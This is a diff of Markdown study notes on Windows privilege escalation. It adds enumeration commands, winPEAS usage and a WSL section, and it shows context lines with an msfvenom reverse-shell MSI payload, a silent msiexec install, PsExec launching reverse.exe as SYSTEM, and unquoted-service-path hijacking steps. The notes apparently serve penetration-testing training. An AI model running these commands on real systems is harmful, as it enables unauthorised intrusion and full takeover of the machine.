@@ -1,19 +1,5 @@
 ## [../](../)
 
-# General Concepts
-
-Our ultimate goal with privilege escalation in Windows is to gain a shell running as an Administrator or the SYSTEM user.
-
-Privilege escalation can be simple (e.g. a kernel exploit) or require a lot of reconnaissance on the compromised system.
-
-In a lot of cases, privilege escalation may not simply rely on a single misconfiguration, but may require you to think, and combine multiple misconfigurations.
-
-All privilege escalations are effectively examples of access control violations.
-
-Access control and user permissions are intrinsically linked.
-
-When focusing on privilege escalations in Windows, understanding how Windows handles permissions is very important.
-
 # Spawning Administrator Shells
 
 ## msfvenom
@@ -40,7 +26,73 @@ To escalate from an admin user to full SYSTEM privileges, you can use the PsExec
 .\PsExec64.exe -accepteula -i -s C:\PrivEsc\reverse.exe
 ```
 
+# Manual enumeration
+
+## System enumeration
+
+```
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
+hostname
+wimc qfe
+wimc logicaldisk get caption,description,providername
+```
+
+## User enumeration
+
+```
+whoami
+whoami /priv
+whoami /groups
+net user
+net user <netuser>
+net localgroup
+net localgroup <group>
+```
+
+## Network enumeration
+
+```
+ipconfig
+ipconfig /all
+arp -a
+route print
+netstat -ano
+```
+
+## Firewall and AV enumeration
+
+```
+sc query windefend
+sc queryex type= service
+netsh advfirewall firewall dump
+netsh firewall show state
+netsh firewall show config
+```
+
 # Privilege Escalation Tools
+
+## winPEAS
+
+https://github.com/carlospolop/privilege-escalationawesome-scripts-suite/tree/master/winPEAS
+
+Before running, we need to add a registry key and then reopen the command prompt:
+
+```
+reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
+```
+
+Run all checks while avoiding time-consuming searches:
+
+```
+.\winPEASany.exe quiet cmd fast
+```
+
+Run specific check categories:
+
+```
+.\winPEASany.exe quiet cmd systeminfo
+```
+
 
 ## PowerUp & SharpUp
 
@@ -87,36 +139,13 @@ Pre-Compiled: https://github.com/r3motecontrol/GhostpackCompiledBinaries/blob/ma
 To run all checks and filter out unimportant results:
 
 ```
-> .\Seatbelt.exe all
+.\Seatbelt.exe all
 ```
 
 To run specific check(s):
 
 ```
 .\Seatbelt.exe <check> <check> …
-```
-
-## winPEAS
-winPEAS is a very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.
-
-https://github.com/carlospolop/privilege-escalationawesome-scripts-suite/tree/master/winPEAS
-
-Before running, we need to add a registry key and then reopen the command prompt:
-
-```
-reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
-```
-
-Run all checks while avoiding time-consuming searches:
-
-```
-.\winPEASany.exe quiet cmd fast
-```
-
-Run specific check categories:
-
-```
-.\winPEASany.exe quiet cmd systeminfo
 ```
 
 ## accesschk.exe
@@ -127,9 +156,7 @@ You can use it to check whether a user or group has access to files, directories
 
 The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an /accepteula command line option.
 
-# Actual Privilege Escalation Techniques
-
-## Kernel Exploits
+# Kernel Exploits
 
 Finding and using kernel exploits is usually a simple process:
 
@@ -139,7 +166,7 @@ Finding and using kernel exploits is usually a simple process:
 
 Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.
 
-### Tools
+## Tools
 
 Windows Exploit Suggester: https://github.com/bitsadmin/wesng
 
@@ -147,7 +174,7 @@ Precompiled Kernel Exploits: https://github.com/SecWiki/windows-kernel-exploits
 
 Watson: https://github.com/rasta-mouse/Watson
 
-### Exploitation
+## Exploitation
 
 1. Extract the output of the systeminfo command:
 ```
@@ -240,7 +267,7 @@ the executable, with two arguments: “Files\Some” and “Dir\ SomeProgram.exe
 Windows resolves this ambiguity by checking each of the possibilities in turn.
 If we can write to a location Windows checks before the actual executable, we
 can trick the service into executing it instead.
-55
+
 ### Privilege Escalation
 1. Run winPEAS to check for service misconfigurations:
 ```
@@ -432,6 +459,17 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f msi -o 
 and run the installer to trigger the exploit:
 ```
 msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
+# Windows Subsystem for Linux
+
+```
+where /R c:\windows bash.exe
+where /R c:\windows wsl.exe
+wsl.exe whoami
+./ubuntu1604.exe config --default-user root
+wsl.exe whoami
+wsl.exe python -c 'reverse shell'
 ```
 
 # Bad Password Practices
